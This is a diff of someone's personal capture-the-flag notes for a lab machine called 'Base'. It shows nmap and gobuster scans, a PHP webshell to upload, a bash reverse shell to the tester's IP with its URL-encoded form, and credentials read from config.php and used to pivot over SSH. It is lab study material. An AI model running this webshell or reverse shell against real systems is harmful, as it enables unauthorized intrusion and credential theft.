@@ -13,7 +13,7 @@ MyIP=10.10.15.79
 
 ### nmap -sCV -oN nmap-CV.txt $IP
 
-PORT   STATE SERVICE VERSION
+`PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 f65c9b38eca75c791c1f181c5246f70b (RSA)
@@ -22,7 +22,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-title: Welcome to Base
 |_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
 
 
 ### nmap -p- -T5 $IP
@@ -33,7 +33,7 @@ PORT   STATE SERVICE
 
 from login dir 
 
-<?php
+`<?php
 session_start();
 if (!empty($_POST['username']) && !empty($_POST['password'])) {
     require('config.php');
@@ -46,7 +46,7 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
         }
     } else {
         print("<script>alert('Wrong Username or Password')</script>");
-    }
+    }`
 
 
 intercept the login and chang
@@ -64,45 +64,39 @@ echo "<?php phpinfo(), ?>" > test.php
 *note to self*: when uploading file don't forget to turn off the poxy or at lest see if it can be fowrded 
 
 ## Gobuster 
-gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirb/big.txt 
-2023/05/30 15:55:37 Starting gobuster in directory enumeration mode
+`gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirb/big.txt 
+2023/05/30 15:55:37 Starting gobuster in directory enumeration mode`
 
-/.htaccess            (Status: 403) [Size: 278]
+`/.htaccess            (Status: 403) [Size: 278]
 /.htpasswd            (Status: 403) [Size: 278]
 /_uploaded            (Status: 301) [Size: 318] [--> http://10.129.95.184/_uploaded/]
 /assets               (Status: 301) [Size: 315] [--> http://10.129.95.184/assets/]   
 /forms                (Status: 301) [Size: 314] [--> http://10.129.95.184/forms/]    
 /login                (Status: 301) [Size: 314] [--> http://10.129.95.184/login/]    
 /server-status        (Status: 403) [Size: 278]                                      
-2023/05/30 15:58:22 Finished
+2023/05/30 15:58:22 Finished`
 
 
 ## To login
 
 uplad file that has 
- `<?php echo system($_REQUEST['cmd']);?>`
+`<?php echo system($_REQUEST['cmd']);?>`
  in file called webshell.php or other
  
  then go to /_uploaded and open the file in the broser and you should get a ?cmd=
  in the url I had to type it in but it worked once i did 
- then using burp intercept, change the request type to POST from GET then send to reptert and url encode /bin/bash -c 'bash -i >& /dev/tcp/&MyIP/PORT 0>&1'
- `%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%35%2e%37%39%2f%35%35%35%35%20%30%3e%26%31%27`
+ then using burp intercept, change the request type to POST from GET then send to reptert and url encode /bin/bash -c 'bash -i >& `/dev/tcp/&MyIP/PORT 0>&1'
+ %2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%35%2e%37%39%2f%35%35%35%35%20%30%3e%26%31%27
  then set up your lisaner on the PORT 
  then you will get a rshell
- 
-
- www-data@base:/var/www/html/_uploaded$ cat /var/www/html/login/config.php
-
+www-data@base:/var/www/html/_uploaded$ cat /var/www/html/login/config.php
 cat /var/www/html/login/config.php
-
 username = "admin";
 password = "thisisagoodpassword";
-
 ls /home
 john
-
 cant su john
-so ssh john
+so ssh john`
 
 
 ##### user.txt
